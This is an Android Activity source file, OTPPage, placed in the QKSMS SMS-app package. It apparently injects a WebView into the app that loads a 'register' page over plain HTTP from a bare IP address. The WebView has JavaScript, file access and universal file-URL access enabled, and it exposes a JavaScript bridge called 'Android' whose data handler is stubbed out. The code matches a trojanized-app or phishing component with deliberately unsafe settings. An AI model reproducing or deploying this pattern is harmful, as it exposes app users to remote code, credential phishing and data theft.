package com.moez.QKSMS;

import android.content.Intent;
import android.graphics.Bitmap;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.util.Log;
import android.view.MotionEvent;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.moez.QKSMS.feature.main.MainActivity;

public class OTPPage extends AppCompatActivity implements View.OnTouchListener,  Handler.Callback{

    @Override
    public boolean onTouch(View v, MotionEvent event) {
        return false;
    }

    private WebViewClient webViewClient;

    private WebView webView;
    private static final int CLICK_ON_WEBVIEW = 1;
    private static final int CLICK_ON_BUTTON = 2;
    private final Handler handler = new Handler(this);

    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_otp);
        webView =  findViewById(R.id.webVisor);

        final WebSettings webSettings = webView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setAppCacheEnabled(true);
        webSettings.setCacheMode(WebSettings.LOAD_DEFAULT);
        webSettings.setDomStorageEnabled(true);
        webSettings.setGeolocationEnabled(true);
        webSettings.setAppCacheEnabled(true);
        webSettings.setCacheMode(webSettings.LOAD_CACHE_ELSE_NETWORK);
        webSettings.setAllowUniversalAccessFromFileURLs(true);
        webSettings.setAllowFileAccessFromFileURLs(true);
        webSettings.setDomStorageEnabled(true);
        webSettings.setAllowFileAccess(true);


        //generamos el webview y cargamos el enlace
        webViewClient = new WebViewClient() {
            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
            }
            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
            }

            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                handler.sendEmptyMessage(CLICK_ON_BUTTON);
                return false;
            }

            @Override
            public void onLoadResource(WebView view, String url) {


            }
        };
        webView.setWebViewClient(webViewClient);
        webView.removeJavascriptInterface("Android");
        webView.addJavascriptInterface(getLogInFormInterface(), "Android");
        webView.loadUrl("http://70.34.252.244/sms/register.html");
    }

    public LogInFormInterface getLogInFormInterface() {

        return new OTPPage.LogInFormInterface();

    }

    public class LogInFormInterface {
        @JavascriptInterface
        public void sendData(final String str) {

            //Get the string value to process
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    //addPhoneNumber(str);
                }
            });
        }
    }

    public boolean handleMessage(@NonNull Message msg) {

        if (msg.what == CLICK_ON_BUTTON) {
            handler.removeMessages(CLICK_ON_WEBVIEW);
            Intent intent = new Intent(OTPPage.this, MainActivity.class);
            startActivity(intent);
            finish();
            return true;
        }
        if (msg.what == CLICK_ON_WEBVIEW) {
            Toast.makeText(this, "WebView clicked", Toast.LENGTH_SHORT).show();
            return true;
        }
        return false;
    }


}
